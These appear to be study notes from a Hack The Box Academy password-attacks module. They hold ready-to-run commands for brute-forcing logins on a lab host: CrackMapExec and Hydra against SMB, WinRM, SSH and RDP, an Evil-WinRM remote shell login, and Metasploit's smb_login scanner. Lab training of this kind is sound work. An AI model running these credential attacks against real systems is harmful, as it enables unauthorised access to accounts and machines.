
https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
##### SMB, LDAP, MSSQL, etc.
https://github.com/byt3bl33d3r/CrackMapExec

```shell
sudo apt-get -y install crackmapexec

crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

```shell
crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
```

#### Evil-WinRM
```
sudo gem install evil-winrm
evil-winrm -i 10.129.42.197 -u user -p password
```


##### SSH , RDP, SMB

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

```shell-session
 hydra -L user.list -P password.list rdp://10.129.42.197
```

```shell-session
 hydra -L user.list -P password.list smb://10.129.42.197
```

##### SMB via metasploit

```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE password.list
set USER_FILE username.list
set RHOST STMIP
run
```